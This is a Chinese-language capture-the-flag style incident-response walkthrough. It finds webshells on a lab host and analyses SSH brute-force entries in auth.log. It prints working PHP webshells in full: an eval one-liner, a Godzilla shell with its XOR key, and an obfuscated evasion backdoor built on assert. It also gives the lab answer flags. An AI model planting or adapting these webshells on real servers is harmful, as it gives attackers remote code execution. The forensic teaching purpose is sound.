## 第一章 应急响应-webshell查杀

### 简介

> ```
> 靶机账号密码 root xjwebshell
> 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}
> 2.黑客使用的什么工具的shell github地址的md5 flag{md5}
> 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx
> 4.黑客免杀马完整路径 md5 flag{md5}
> ```

### 1.黑客webshell里面的flag

```bash
grep -nr "eval" .
```

```
./include/gz.php:23:            eval($payload);
./include/Db/.Mysqli.php:22:            eval($payload);
./shell.php:1:<?php phpinfo();@eval($_REQUEST[1]);?>
```

### 2.黑客使用的什么工具的shell

查看`gz.php`，发现是哥斯拉的特征

https://github.com/BeichenDream/Godzilla

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K) {
	for ($i=0;$i
	        $c = $K[$i+1&15];                                                                                                                                                 
	        $D[$i] = $D[$i]^$c;
}
return $D;
}
$payloadName='payload';                                                                                                                                                   
$key='3c6e0b8a9c15224a';                                                                                                                                                  
$data=file_get_contents("php://input");                                                                                                                                   
if ($data!==false) {
$data=encode($data,$key);                                                                                                                                             
    if (isset($_SESSION[$payloadName])) {
	$payload=encode($_SESSION[$payloadName],$key);                                                                                                                    
	        if (strpos($payload,"getBasicsInfo")===false) {
		$payload=encode($payload,$key);
	}
	eval($payload);                                                                                                                                           
	        echo encode(@run($data),$key);
} else {
	if (strpos($data,"getBasicsInfo")!==false) {
		$_SESSION[$payloadName]=encode($data,$key);
	}
}
}
```

### 3.黑客隐藏shell的完整路径

```
/var/www/html/include/Db/.Mysqli.php
```

### 4.黑客免杀马完整路径

查看apache的日志

```bash
cat /var/log/apache2/access.log
```



```
192.168.200.2 - - [02/Aug/2023:08:56:10 +0000] "GET /wap/top.php?fuc=ERsDHgEUC1hI&func2=ser HTTP/1.1" 500 185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.200.2 - - [02/Aug/2023:08:56:24 +0000] "GET /wap/top.php?fuc=ERsDHgEUC1hI&func2=sert HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
```

查看top.php的内容

```php
<?php

$key = "password";

//ERsDHgEUC1hI
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);
```

## 第一章 应急响应-Linux日志分析

### 简介

> ```
> 账号root密码linuxrz
> ssh root@IP
> 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用","分割
> 2.ssh爆破成功登陆的IP是多少，如果有多个使用","分割
> 3.爆破用户名字典是什么？如果有多个使用","分割
> 4.登陆成功的IP共爆破了多少次
> 5.黑客登陆主机后新建了一个后门用户，用户名是多少
> ```

### 1.有多少IP在爆破主机ssh的root帐号

在Debian和Ubuntu等发行版中，SSH登录信息可能保存在`/var/log/auth.log`文件中

这里信息放在了`/var/log/auth.log.1`中

```bash
cat /var/log/auth.log.1 | gerp -a "Failed password for root"
```

```
Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2
Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2
Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2
Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2
Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2
Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2
```

然后就是将每行的IP取出来

```bash
cat /var/log/auth.log.1 | grep -a "Failed password for root"|awk '{print $11}'
```

然后去除重复行，排序

```bash
cat /var/log/auth.log.1 | grep -a "Failed password for root"|awk '{print $11}' | uniq -c |sort -nr
```

> uniq的-c选项是统计重复行行数
>
> sort的-n是按数字排序，-n是进行倒序

`flag{192.168.200.2,192.168.200.32,192.168.200.31}`

### 2.ssh爆破成功登陆的IP是多少

```bash
cat auth.log.1 | grep -a "Accepted password for root" |awk '{print $11}'
```

`flag{192.168.200.2}`

### 3.爆破用户名字典是什么？

```bash
cat auth.log.1 | grep -a "Failed password for"| perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'| uniq -c | sort -nr
```

`flag{user,hello,root,test3,test2,test1}`

### 4.登陆成功的IP共爆破了多少次

登录成功的IP是`192.168.200.2`，用户名是`root`

```bash
cat auth.log.1| grep -a "Failed password for"|grep -a "root"|grep "192.168.200.2"
```

`flag{4}`

### 5.黑客登陆主机后新建了一个后门用户，用户名是多少

查看`/etc/passwd`

```bash
cat /etc/passwd
```

或者

```bash
cat auth.log.1| grep -a "new user"
```

`flag{test2}`
